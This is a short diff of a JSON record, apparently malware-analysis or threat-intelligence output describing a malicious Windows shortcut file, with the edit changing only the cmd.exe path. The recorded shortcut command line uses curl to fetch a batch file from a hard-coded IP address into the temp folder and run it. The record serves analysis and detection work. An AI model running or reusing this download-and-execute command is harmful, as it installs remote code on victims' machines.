@@ -29,7 +29,7 @@
                 "B2:FC:36:F3:3F:15"
             ],
             "file.shortcut.command_line": [
-                "..\\..\\..\\Windows\\System32\\cmd.exe /c \"curl http://121.5.28.63/cmd.txt > %temp%\\\\cmd.bat && %temp%\\\\cmd.bat\""
+                "C:\\Windows\\System32\\cmd.exe /c \"curl http://121.5.28.63/cmd.txt > %temp%\\\\cmd.bat && %temp%\\\\cmd.bat\""
             ],
             "file.name.extracted": [
                 "cmd.exe"
